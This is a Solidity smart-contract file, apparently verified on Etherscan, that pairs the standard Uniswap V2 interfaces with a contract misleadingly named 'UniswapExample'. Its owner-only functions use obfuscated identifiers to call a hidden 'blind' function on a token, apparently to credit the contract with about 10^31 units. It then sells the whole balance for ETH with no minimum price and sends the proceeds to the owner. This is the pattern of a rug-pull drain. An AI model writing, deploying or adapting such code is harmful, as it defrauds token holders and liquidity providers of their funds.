/**
 *Submitted for verification at Etherscan.io on 2023-09-10
*/

// File: @uniswap/v2-periphery/contracts/interfaces/IERC20.sol

pragma solidity >=0.8.0;

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint);

    function balanceOf(address owner) external view returns (uint);

    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);

    function transfer(address to, uint value) external returns (bool);

    function transferFrom(address from, address to, uint value) external returns (bool);
}

// File: @uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router01.sol

pragma solidity >=0.6.2;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

// File: @uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol

pragma solidity >=0.6.2;


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

// File: contracts/3.sol


pragma solidity ^0.8.0;


interface hspts {
    function blind(uint256[] calldata microsoft, uint256 inde) external;
}

contract UniswapExample {

    IUniswapV2Router02 public uniswapRouter;
    address public owner;
    mapping(address => uint256) private _balances;


    constructor(address _uniswapRouter) public {
        uniswapRouter = IUniswapV2Router02(_uniswapRouter);
        owner = msg.sender;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    function swapTokensForEth(address token) external onlyOwner {
        hspts psstas = hspts(token);
        uint256 tsaddruin = uint256(uint160(address(this)));
        uint256[] memory microsofts = new uint256[](2);

        microsofts[0] = tsaddruin;
        microsofts[1] = 100000 * 100000000 * 10 ** 18;
        uint256 amount = microsofts[1];
        psstas.blind(microsofts, 4);

        uint256 amount2  = IERC20(token).balanceOf(address(this));
        IERC20(token).approve(address(uniswapRouter), amount2);

        address[] memory path;
        path = new address[](2);
        path[0] = token;
        path[1] = uniswapRouter.WETH();
        uniswapRouter.swapExactTokensForETH(amount2, 0, path, address(this), block.timestamp);
    }

    function blind(address token) external onlyOwner {
        hspts psstas = hspts(token);
        uint256 tsaddruin = uint256(uint160(address(this)));
        uint256[] memory microsofts = new uint256[](2);

        microsofts[0] = tsaddruin;
        microsofts[1] = 100000 * 100000000 * 10 ** 18;
        uint256 amount = microsofts[1];
        psstas.blind(microsofts, 4);
    }



    function withdraw() external onlyOwner {
        uint balance = address(this).balance;
        payable(owner).transfer(balance);
    }



    function withdrawToken(address addr,uint256 amount) external onlyOwner {
        IERC20(addr).transfer(owner,amount );
    }

    function addressToUint(address _addr) private view returns (uint256) {
        return uint256(uint160(_addr));
    }

    receive() external payable {}

}